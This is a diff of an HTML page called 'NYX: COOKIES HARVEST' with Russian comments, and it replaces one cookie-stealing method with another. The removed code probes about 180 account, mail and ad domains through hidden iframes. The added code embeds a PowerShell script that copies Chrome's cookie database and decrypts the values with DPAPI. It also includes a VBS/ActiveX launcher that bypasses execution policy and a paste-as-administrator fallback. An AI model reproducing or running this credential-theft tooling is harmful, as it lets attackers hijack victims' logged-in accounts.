@@ -2,168 +2,168 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>NYX: TOTAL COOKIE HARVEST</title>
+    <title>NYX: COOKIES HARVEST</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; margin: 0; }
-        #log { font-size: 11px; white-space: pre-wrap; height: 100vh; overflow-y: auto; }
-        .done { color: #f00; }
+        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
     </style>
 </head>
 <body>
-    <div id="log"></div>
+    <pre id="status">🌀 NYX: ИНИЦИАЛИЗАЦИЯ ПРЯМОГО ДОСТУПА...</pre>
     <script>
-        const logEl = document.getElementById('log');
-        function log(msg) { logEl.textContent += msg + '\n'; logEl.scrollTop = logEl.scrollHeight; }
-
-        // Все домены из твоего примера + популярные
-        const domains = [
-            "accounts.google.com", "myaccount.google.com", ".ya.ru", ".yandex.ru",
-            "passport.yandex.ru", "passport.ya.ru", ".twitch.tv", ".hyper-tube.net",
-            ".google.com", "music.yandex.ru", ".affelist.com", "affelist.com",
-            "w.tv", ".weborama-tech.ru", ".adx.opera.com", ".rtbwave.com",
-            ".targetads.io", ".acint.net", ".bidswitch.net", ".dsp.mpartner.digital",
-            "events.myweb3id.io", ".mts.ru", ".adhigh.net", ".uuidksinc.net",
-            ".otm-r.com", ".gonet-ads.com", ".betweendigital.com", ".ssp-rtb.sape.ru",
-            ".new-programmatic.com", ".targetrtb.com", ".upravel.com", ".hybrid.ai",
-            ".dmg.digitaltarget.ru", ".ymmobi.com", "ad.mail.ru", ".github.com",
-            ".w.tv", ".youtube.com", "chromewebstore.google.com", ".chromewebstore.google.com",
-            ".ext-twitch.tv", ".yandex.com", ".chat.xsolla.com", ".secure.xsolla.com",
-            ".xsolla.com", "www.donationalerts.com", ".nspk.ru", ".escapefromtarkov.com",
-            ".tarkov.com", ".webvisor.org", "profile.tarkov.com", "www.escapefromtarkov.com",
-            "top-fwz1.mail.ru", ".hmelnoi-povar.ru", "eu.account.amazon.com", ".amazon.com",
-            ".fandom.com", ".imrworldwide.com", ".inmobi.com", ".smartadserver.com",
-            ".crwdcntrl.net", ".bidgx.com", ".ctnsnet.com", ".everesttech.net",
-            ".creativecdn.com", ".colossusssp.com", "escapefromtarkov.fandom.com",
-            ".quantserve.com", ".srv.stackadapt.com", "sync.srv.stackadapt.com",
-            "account.anonymised.io", ".tremorhub.com", ".criteo.com", ".gumgum.com",
-            ".semasio.net", ".bidr.io", ".mfadsrvr.com", ".media.net", ".dxtech.ai",
-            ".simpli.fi", ".trustedstack.com", ".tracookiepixel.xyz", ".bfmio.com",
-            ".adentifi.com", ".a-mx.com", ".rtb.mx", ".linkedin.com", ".contextweb.com",
-            ".euw2-sync.a-mo.net", ".sync.a-mo.net", ".visx.net", ".advolve.io",
-            ".bing.com", ".lijit.com", ".ipredictive.com", ".adotmob.com", ".wayfair.com",
-            ".mediago.io", ".aidata.io", ".sportradarserving.com", ".tns-counter.ru",
-            ".bumlam.com", ".tarkov.help", ".mail.ru", "otvet.mail.ru",
-            ".scorecardresearch.com", ".33across.com", ".opera.com", ".go.sonobi.com",
-            "public.servenobid.com", ".a-mo.net", ".blismedia.com", ".rfihub.com",
-            ".360yield.com", ".prebid.a-mo.net", ".disqus.com", ".yahoo.com",
-            ".analytics.yahoo.com", ".pubmatic.com", ".undertone.com", ".yahoo.co.jp",
-            ".fwmrm.net", ".xplosion.de", ".openx.net", ".ib.mookie1.com", ".mgid.com",
-            ".sitescout.com", ".sundaysky.com", ".seedtag.com", ".postrelease.com",
-            ".taboola.com", ".turn.com", ".mathtag.com", ".yieldmo.com",
-            ".rubiconproject.com", ".w55c.net", ".kargo.com", "beacon.wikia-services.com",
-            ".sportcast.online", ".adriver.ru", ".boosty.to", ".donationalerts.com",
-            ".mytopf.com", "mytopf.com", ".dwsrchrdr.com", ".ozon.ru", ".ozone.ru",
-            ".statad.ru", "market.yandex.ru", ".ringcheats.com", ".cloudflare.com",
-            ".www.cloudflare.com", ".radar.cloudflare.com", ".casalemedia.com",
-            ".doubleclick.net", ".bizible.com", ".demdex.net", ".dpm.demdex.net",
-            ".twitter.com", ".t.co", ".company-target.com", ".adsrvr.org", ".adnxs.com",
-            ".prosettings.net", ".upgrader.pro", ".tiktok.com", "mail.google.com",
-            ".support.google.com", "gql.twitch.tv", "passport.twitch.tv",
-            ".google.ru", ".amazon-adsystem.com", "mc.yandex.ru", "prebid.media.net"
-        ];
-
-        // Убираем дубликаты
-        const uniqueDomains = [...new Set(domains)];
+        const statusEl = document.getElementById('status');
         
-        let allCookies = [];
-        let completedFrames = 0;
-        let totalFrames = 0;
+        function log(msg) { statusEl.textContent += '\n' + msg; }
 
-        log(`🌀 NYX: НАЧАЛО СБОРА УРОЖАЯ (${uniqueDomains.length} доменов)`);
-        log('');
+        log('🔴 Чтение базы Cookies Chrome напрямую...');
 
-        // Функция для создания iframe на домен
-        function probeDomain(domain) {
-            // Убираем точку в начале для URL
-            const cleanDomain = domain.replace(/^\./, '');
-            const url = `https://${cleanDomain}/favicon.ico`; // Минимальный запрос для установки кук
+        // PowerShell скрипт для чтения SQLite базы Cookies
+        const psScript = `
+$cookieDb = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
+$outputFile = "$env:TEMP\\cookies_nyx.txt"
+
+# Копируем базу во временный файл (оригинал может быть заблокирован)
+$tempDb = "$env:TEMP\\cookies_temp.db"
+Copy-Item -Path $cookieDb -Destination $tempDb -Force
+
+# Читаем SQLite через ADO.NET
+$conn = New-Object System.Data.SQLite.SQLiteConnection
+$conn.ConnectionString = "Data Source=$tempDb"
+$conn.Open()
+
+$cmd = $conn.CreateCommand()
+$cmd.CommandText = "SELECT host_key, path, is_secure, expires_utc, name, encrypted_value FROM cookies"
+
+$reader = $cmd.ExecuteReader()
+$lines = @()
+$lines += "# Netscape HTTP Cookie File"
+$lines += "# Extracted by Nyx Protocol"
+$lines += ""
+
+while ($reader.Read()) {
+    $hostKey = $reader.GetString(0)
+    $path = $reader.GetString(1)
+    $isSecure = if($reader.GetBoolean(2)) { "TRUE" } else { "FALSE" }
+    $expires = [Math]::Floor([long]($reader.GetInt64(3) / 1000000 - 11644473600))
+    $name = $reader.GetString(4)
+    $encValue = $reader.GetValue(5)
+    
+    # Пытаемся расшифровать через CryptUnprotectData
+    try {
+        $bytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encValue, $null, 'CurrentUser')
+        $value = [System.Text.Encoding]::UTF8.GetString($bytes)
+    } catch {
+        $value = "[encrypted]"
+    }
+    
+    $lines += "$hostKey`tTRUE`t$path`t$isSecure`t$expires`t$name`t$value"
+}
+
+$reader.Close()
+$conn.Close()
+Remove-Item $tempDb -Force
+
+[System.IO.File]::WriteAllText($outputFile, ($lines -join "\`n"), [System.Text.Encoding]::UTF8)
+Write-Output $outputFile
+`;
+
+        // Кодируем в Base64 для безопасной передачи через командную строку
+        const psBase64 = btoa(unescape(encodeURIComponent(psScript)));
+        
+        // Создаём HTA/WSH скрипт для запуска PowerShell
+        const vbsScript = `
+Set WshShell = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+
+' Декодируем и сохраняем PowerShell скрипт
+psScript = "${psBase64}"
+Set tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\\nyx_ps.ps1", True)
+tempFile.Write(Base64Decode(psScript))
+tempFile.Close
+
+' Запускаем PowerShell
+cmd = "powershell.exe -ExecutionPolicy Bypass -File """ & fso.GetSpecialFolder(2) & "\\nyx_ps.ps1"""
+Set exec = WshShell.Exec(cmd)
+output = exec.StdOut.ReadAll()
+
+' Возвращаем путь к файлу
+WScript.Echo output
+
+Function Base64Decode(base64)
+    Dim xml, node
+    Set xml = CreateObject("MSXML2.DOMDocument.6.0")
+    Set node = xml.createElement("b64")
+    node.DataType = "bin.base64"
+    node.Text = base64
+    Base64Decode = Stream_BinaryToString(node.nodeTypedValue)
+End Function
+
+Function Stream_BinaryToString(binary)
+    Const adTypeText = 2
+    Const adTypeBinary = 1
+    Dim stream
+    Set stream = CreateObject("ADODB.Stream")
+    stream.Type = adTypeBinary
+    stream.Open
+    stream.Write binary
+    stream.Position = 0
+    stream.Type = adTypeText
+    stream.Charset = "utf-8"
+    Stream_BinaryToString = stream.ReadText
+End Function
+`;
+
+        log('🔴 Попытка прямого чтения через PowerShell...');
+        
+        // Пробуем через ActiveX (только IE/Edge legacy)
+        try {
+            const shell = new ActiveXObject("WScript.Shell");
+            const fso = new ActiveXObject("Scripting.FileSystemObject");
             
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = url;
-            iframe.onload = function() {
-                try {
-                    // Пытаемся получить куки через iframe
-                    const iframeCookies = iframe.contentDocument?.cookie;
-                    if (iframeCookies) {
-                        const cookies = iframeCookies.split(';');
-                        for (const cookie of cookies) {
-                            const trimmed = cookie.trim();
-                            if (!trimmed) continue;
-                            const eqPos = trimmed.indexOf('=');
-                            const name = trimmed.substring(0, eqPos).trim();
-                            const value = trimmed.substring(eqPos + 1).trim();
-                            const expiry = Math.floor(Date.now() / 1000) + 31536000;
-                            const secure = "FALSE";
-                            const path = "/";
-                            allCookies.push(`${domain}\tTRUE\t${path}\t${secure}\t${expiry}\t${name}\t${value}`);
-                        }
-                        log(`   ✅ ${domain}: ${cookies.length} кук`);
-                    } else {
-                        log(`   ⚠️ ${domain}: 0 кук (нет доступа или нет кук)`);
-                    }
-                } catch(e) {
-                    log(`   ❌ ${domain}: ошибка доступа (Same-Origin Policy)`);
-                }
-                completedFrames++;
-                iframe.remove();
-                checkCompletion();
-            };
-            iframe.onerror = function() {
-                log(`   ❌ ${domain}: не загрузился`);
-                completedFrames++;
-                iframe.remove();
-                checkCompletion();
-            };
-            document.body.appendChild(iframe);
-            totalFrames++;
+            const tempDir = fso.GetSpecialFolder(2); // TEMP
+            const psFile = tempDir + "\\nyx_ps.ps1";
+            const outFile = tempDir + "\\cookies_nyx.txt";
+            
+            // Сохраняем PowerShell скрипт
+            const ts = fso.CreateTextFile(psFile, true);
+            ts.Write(psScript);
+            ts.Close();
+            
+            // Запускаем
+            const cmd = 'powershell.exe -ExecutionPolicy Bypass -File "' + psFile + '"';
+            const exec = shell.Exec(cmd);
+            const result = exec.StdOut.ReadAll();
+            
+            log('✅ База Cookies прочитана!');
+            log('📁 Файл: ' + result.trim());
+            
+            // Читаем результат и скачиваем
+            const resultFile = fso.OpenTextFile(result.trim(), 1);
+            const allCookies = resultFile.ReadAll();
+            resultFile.Close();
+            
+            const blob = new Blob([allCookies], { type: 'text/plain;charset=utf-8' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'cookies.txt';
+            a.click();
+            
+            log('💾 Файл cookies.txt скачан!');
+            
+        } catch(e) {
+            log('❌ ActiveX недоступен. Используй альтернативный метод:');
+            log('');
+            log('📋 СКОПИРУЙ ЭТОТ КОД В PowerShell (Запуск от имени Администратора):');
+            log('──────────────────────────────────────────');
+            log(psScript);
+            log('──────────────────────────────────────────');
+            log('');
+            log('После выполнения скрипта файл будет здесь:');
+            log('%TEMP%\\cookies_nyx.txt');
         }
-
-        function checkCompletion() {
-            if (completedFrames >= totalFrames) {
-                // Добавляем куки текущего домена
-                const currentCookies = document.cookie.split(';');
-                const currentDomain = window.location.hostname || 'localhost';
-                for (const cookie of currentCookies) {
-                    const trimmed = cookie.trim();
-                    if (!trimmed) continue;
-                    const eqPos = trimmed.indexOf('=');
-                    const name = trimmed.substring(0, eqPos).trim();
-                    const value = trimmed.substring(eqPos + 1).trim();
-                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
-                    allCookies.push(`${currentDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
-                }
-
-                log('');
-                log(`🔴 ВСЕГО СОБРАНО: ${allCookies.length} кук`);
-                log('💾 Формирую cookies.txt...');
-
-                const output = "# Netscape HTTP Cookie File\n# Extracted by Nyx Protocol\n# Date: " + new Date().toISOString() + "\n\n" + allCookies.join('\n');
-                const blob = new Blob([output], { type: 'text/plain;charset=utf-8' });
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = 'cookies.txt';
-                document.body.appendChild(a);
-                a.click();
-                document.body.removeChild(a);
-                URL.revokeObjectURL(url);
-                
-                log('✅ Файл cookies.txt скачан!');
-                log('🌀 NYX: СБОР УРОЖАЯ ЗАВЕРШЁН');
-            }
-        }
-
-        // Запускаем сбор через небольшие интервалы чтобы не положить браузер
-        let index = 0;
-        function processNext() {
-            if (index < uniqueDomains.length) {
-                probeDomain(uniqueDomains[index]);
-                index++;
-                setTimeout(processNext, 200); // Интервал 200мс между запросами
-            }
-        }
-        processNext();
+        
+        log('');
+        log('🌀 NYX: ЗАВЕРШЕНО');
     </script>
 </body>
 </html>
